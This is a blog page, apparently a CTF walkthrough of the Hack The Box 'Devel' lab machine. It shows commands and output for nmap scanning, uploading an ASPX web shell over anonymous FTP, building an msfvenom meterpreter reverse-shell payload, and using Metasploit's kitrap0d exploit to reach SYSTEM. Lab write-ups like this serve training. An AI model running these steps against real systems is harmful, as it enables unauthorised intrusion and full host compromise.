@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Devel - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Devel"><a href="#Hack-The-Box-Devel" class="headerlink" title="Hack The Box - Devel"></a>Hack The Box - Devel</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Devel is a machine, another simple beginner Windows target. I’ll use anonymous access to FTP in the webroot of the machine and next using reverse conections with metasploit will gain target access. It is a beginner-level machine which its IP address is <code>10.10.10.5.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/devel/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services, with the option <code>-sC</code>for show us information about vulnerabilities:
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)<br>|<br>|-->{SFire129}#nmap -sC -v 10.10.10.5
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 15:00 EDT
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 15:00 EDT
+ NSE: Loaded 121 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Initiating NSE at 15:00
+ Scanning 10.10.10.5 [1000 ports]
+ Discovered open port 80/tcp on 10.10.10.5
+ Discovered open port 21/tcp on 10.10.10.5
+ Completed SYN Stealth Scan at 15:00, 8.71s elapsed (1000 total ports)
+ NSE: Script scanning 10.10.10.5.
+ Initiating NSE at 15:00
+ NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+ Completed NSE at 15:00, 3.91s elapsed
+ Initiating NSE at 15:00
+ Completed NSE at 15:00, 0.00s elapsed
+ Nmap scan report for 10.10.10.5
+ Host is up (0.12s latency).
+ Not shown: 998 filtered ports
+ PORT   STATE SERVICE
+ 21/tcp open  ftp
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ | 03-18-17  02:06AM       DIR          aspnet_client
+ | 05-12-20  05:14AM                 2871 devel.aspx
+ | 05-12-20  05:18AM       DIR          GYSLBKZULO
+ | 05-12-20  02:58AM                   12 htb.html
+ | 03-17-17  05:37PM                  689 iisstart.htm
+ | 05-12-20  05:19AM       DIR          NYUXGVSNHL
+ |_03-17-17  05:37PM               184946 welcome.png
+ | ftp-syst:
+ |_  SYST: Windows_NT
+ 80/tcp open  http
+ | http-methods:
+ |   Supported Methods: OPTIONS TRACE GET HEAD POST
+ |_  Potentially risky methods: TRACE
+ |_http-title: IIS7
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 15:00
+ Completed NSE at 15:00, 0.00s elapsed
+ Initiating NSE at 15:00
+ Completed NSE at 15:00, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds
+            Raw packets sent: 2007 (88.284KB) | Rcvd: 8 (336B)
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#</figure></pre><br>
+
+<p>Nmap reveals <code>Service ftpd </code>on port 21 with anonymous login and <code>http service</code> on ports 80/tcp.
+ Verifying the anonymous conection with ftp service.<br><br>
+  1.) To create a file test.txt and put inside some...<br>
+  2.) Open conection ftp and login with username/password anonymous:anonymous<br>
+  3.) Type command <code>bin</code> and with <code>put</code> the file to the server.<br>
+  4.) With command <code>curl</code> will check the file uploaded.
+<br>
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#echo Hello, I was here..Diego >>test.txt
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#ftp 10.10.10.5
+ Connected to 10.10.10.5.
+ 220 Microsoft FTP Service
+ Name (10.10.10.5:kali): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> bin
+ 200 Type set to I.
+ ftp> put test.txt
+ local: test.txt remote: test.txt
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 27 bytes sent in 0.00 secs (185.6844 kB/s)
+ ftp> quit
+ 221 Goodbye.
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#curl http://10.10.10.5/test.txt
+ 1
+ Hello, I was here..Diego
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#</figure></pre>
+ 
+ <p> In the web browser
+ 
+ <img src="/images/hackthebox/exploit/devel/1.png" alt="">
+ 
+<h2 id="Uploading Web Shell"><a href="#Uploading-Web-Shell" class="headerlink" title="Uploading Web Shell"></a>Uploading Web Shell</h2>
+<p> Execute locate cmd.aspx to find the web shell into the Kali.
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox)<br>|<br>|-->{SFire129}#locate cmd.aspx
+ /usr/share/davtest/backdoors/asp_cmd.asp
+ /usr/share/davtest/backdoors/aspx_cmd.aspx
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#cp /usr/share/davtest/backdoors/aspx_cmd.aspx cmd.aspx </figure></pre>
+<br>
+
+<p> Uploading Web Shell in the FTP connection
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#ftp 10.10.10.5
+ Connected to 10.10.10.5.
+ 220 Microsoft FTP Service
+ Name (10.10.10.5:kali): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> bin
+ 200 Type set to I.
+ ftp> put cmd.apsx
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 1398 bytes sent in 0.00 secs (12.8196 MB/s)
+ ftp> </figure></pre>
+ 
+
+ 
+ <h2 id="Webshell Execution"><a href="#Webshell-Execution-Phase" class="headerlink" title="Webshell Execution"></a> Webshell Execution</h2>
+ <p> When you visit the page <code> http://10.10.10.5/cmd.apsx</code>, will look and run the commands: 
+ <br>
+ <pre><figure class="highlight plain">
+ <img src="/images/hackthebox/exploit/devel/2.png" alt="">
+ <img src="/images/hackthebox/exploit/devel/3.png" alt="">
+ <img src="/images/hackthebox/exploit/devel/4.png" alt="">
+ </figure></pre>
+ <p> The apppool\web is an user with minimum privileges, then a shell generated by web shell could not be work. We will need to get privileges.
+ 
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2>
+
+<p> For exploit we need to generate a payload code and launch metasploit.<br>
+
+1.) Generate a payload: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f aspx > reverse.aspx</code><br>
+2.) Upload the payload reverse.aspx by ftp service<br>
+3.) Launch metasploit and use exploit/multi/handle with your localhost, in my case 10.10.14.21.<br>
+4.) Set payload with <code>set payload windows/meterpreter/reverse_tcp</code> <br>
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)
+|
+|-->{SFire129}#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=4444 -f aspx > reverse.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2809 bytes
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#ftp 10.10.10.5
+ Connected to 10.10.10.5.
+ 220 Microsoft FTP Service
+ Name (10.10.10.5:kali): anonymous
+ 331 Anonymous access allowed, send identity (e-mail name) as password.
+ Password:
+ 230 User logged in.
+ Remote system type is Windows_NT.
+ ftp> bin put reverse.aspx
+ 200 Type set to I.
+ ftp> bin
+ 200 Type set to I.
+ ftp> put reverse.aspx
+ ?Ambiguous command
+ ftp> put reverse.aspx
+ local: reverse.aspx remote: reverse.aspx
+ 200 PORT command successful.
+ 125 Data connection already open; Transfer starting.
+ 226 Transfer complete.
+ 2809 bytes sent in 0.00 secs (32.2756 MB/s)
+ ftp> quit
+ cu221 Goodbye.
+ |-------(root@kali)-------|(~/HackTheBox)
+ |
+ |-->{SFire129}#msfconsole
+ msf5 > use exploit/multi/handler
+ msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+ payload => windows/meterpreter/reverse_tcp
+ msf5 exploit(multi/handler) > show options
+ 
+ Module options (exploit/multi/handler):
+ 
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+ 
+ 
+ Payload options (windows/meterpreter/reverse_tcp):
+ 
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST                      yes       The listen address (an interface may be specified)
+    LPORT     4444             yes       The listen port
+ 
+ 
+ Exploit target:
+ 
+    Id  Name
+    --  ----
+    0   Wildcard Target
+ 
+ 
+ msf5 exploit(multi/handler) > set LHOST 10.10.14.21
+ LHOST => 10.10.14.21
+ msf5 exploit(multi/handler) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.21:4444
+ [*] Sending stage (180291 bytes) to 10.10.10.5
+ meterpreter > getuid
+ Server username: IIS APPPOOL\Web  </figure></pre>
+ 
+ <h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
+<p> The <code>getuid</code> command show us the same privileges, we will to need to get privileges.<br>
+1.) Set post exploit <code>use post/multi/recon/local_exploit_suggester</code><br>
+2.) Set the session number, in my case is number 1.<br>
+3.) Run
+<pre><figure class="highlight plain"> meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf5 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf5 post(multi/recon/local_exploit_suggester) > run
+[*] 10.10.10.5 - Collecting local exploits for x86/windows...
+[*] 10.10.10.5 - 30 exploit checks are being tried...
+[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed </figure></pre>
+
+<p> Now, will be need to execute <code>ms10_015_kitrap0d</code>:<br>
+1.) use exploit/windows/local/ms10_015_kitrap0d.<br>
+2.) set session 1<br>
+3.) run<br>
+ 
+ <pre><figure class="highlight plain"> msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
+ msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.21
+ msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
+ msf5 exploit(windows/local/ms10_015_kitrap0d) > run
+ [*] Started reverse TCP handler on 10.10.14.21:4444
+[*] Launching notepad to host the exploit...
+[+] Process 3244 launched.
+[*] Reflectively injecting the exploit DLL into 3244...
+[*] Injecting exploit into 3244 ...
+[*] Exploit injected. Injecting payload into 3244...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (180291 bytes) to 10.10.10.5
+[*] Meterpreter session 3 opened (10.10.14.21:4444 -> 10.10.10.5:49160) at 2020-05-08 16:54:00 -0400
+
+ meterpreter > getuid
+ Server username: NT AUTHORITY\SYSTEM
+ meterpreter > shell
+ Process 3576 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.1.7600]
+ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+ c:\windows\system32\inetsrv>whoami 
+ whoami
+ nt authority\system
+ .</figure></pre>
+  <p> We are <code>t authority\system</code> on the machine.
+
+  <br>
+   <h2 id="Capture the Flag"><a href="#Capture-the-Flag" class="headerlink" title="Capture the Flag"></a>Capture the Flag</h2>
+    <pre><figure class="highlight plain"> c:\windows\system32\inetsrv>cd ..
+ c:\Windows>cd ..
+ c:\cd Users
+ c:\Users>dir
+ dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users
+
+ 18/03/2017  02:16     DIR          .
+ 18/03/2017  02:16     DIR          ..
+ 18/03/2017  02:16     DIR          Administrator
+ 17/03/2017  05:17     DIR          babis
+ 18/03/2017  02:06     DIR          Classic .NET AppPool
+ 14/07/2009  10:20     DIR          Public
+               0 File(s)              0 bytes
+               6 Dir(s)  24.375.783.424 bytes free
+
+ c:\Users>cd babis
+ c:\Users\babis>cd Desktop
+ c:\Users\babis\Desktop>type user.txt.txt
+  ***here will be show you the flag user**
+ c:\Users\babis\Desktop>cd ..
+ c:\Users\babis>cd ..
+ c:\Users>cd administrator
+ c:\Users\Administrator>cd Desktop
+ c:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8620-71F1
+
+ Directory of c:\Users\Administrator\Desktop
+
+18/03/2017  02:17     DIR          .
+18/03/2017  02:17     DIR          ..
+18/03/2017  02:17                 32 root.txt.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  24.375.779.328 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt.txt
+ ***here will be show you the flag root**
+c:\Users\Administrator\Desktop></figure></pre>
+	<br>
+  
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-10</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
